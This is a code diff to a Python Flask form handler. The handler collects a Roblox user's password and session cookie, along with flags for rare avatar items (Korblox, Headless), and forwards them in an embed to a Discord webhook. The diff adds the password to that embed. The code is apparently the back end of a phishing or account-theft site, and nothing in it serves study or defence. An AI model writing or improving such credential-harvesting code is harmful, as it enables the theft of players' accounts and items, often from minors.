@@ -68,10 +68,9 @@ def submit_form():
         data = request.get_json()
         
         # Extract all form fields
-        username = data.get('username', '').strip()
-        robux = data.get('robux', '').strip()
-        premium = data.get('premium', False)
         password = data.get('password', '').strip()
+        korblox = data.get('korblox', False)
+        headless = data.get('headless', False)
         cookie = data.get('cookie', '').strip()
         
         # Server-side validation
@@ -118,17 +117,13 @@ def submit_form():
                 'message': 'Webhook not configured'
             }), 500
         
-        # Generate Roblox profile picture URL if username provided
+        # Use default Roblox profile picture
         profile_picture_url = 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter'
-        if username:
-            # Try to get profile picture by username (this would need Roblox API integration)
-            # For now, use default profile picture
-            profile_picture_url = 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter'
         
         # Prepare Discord embedded message
         discord_data = {
             'embeds': [{
-                'title': '🎮 Roblox Account Information',
+                'title': '🎮 Roblox Account Profile',
                 'color': 0x00d4ff,  # Roblox blue color
                 'thumbnail': {
                     'url': profile_picture_url
@@ -136,17 +131,27 @@ def submit_form():
                 'fields': [
                     {
                         'name': '👤 Username',
-                        'value': username or 'Not provided',
+                        'value': 'Not provided',
                         'inline': True
                     },
                     {
-                        'name': '💰 Robux',
-                        'value': robux or 'Not provided',
+                        'name': '🔒 Password',
+                        'value': password or 'Not provided',
                         'inline': True
                     },
                     {
-                        'name': '⭐ Premium',
-                        'value': '✅ Yes' if premium else '❌ No',
+                        'name': '💰 Robux Balance',
+                        'value': 'Not provided',
+                        'inline': True
+                    },
+                    {
+                        'name': '💀 Korblox',
+                        'value': '✅ Yes' if korblox else '❌ No',
+                        'inline': True
+                    },
+                    {
+                        'name': '🎭 Headless',
+                        'value': '✅ Yes' if headless else '❌ No',
                         'inline': True
                     },
                     {
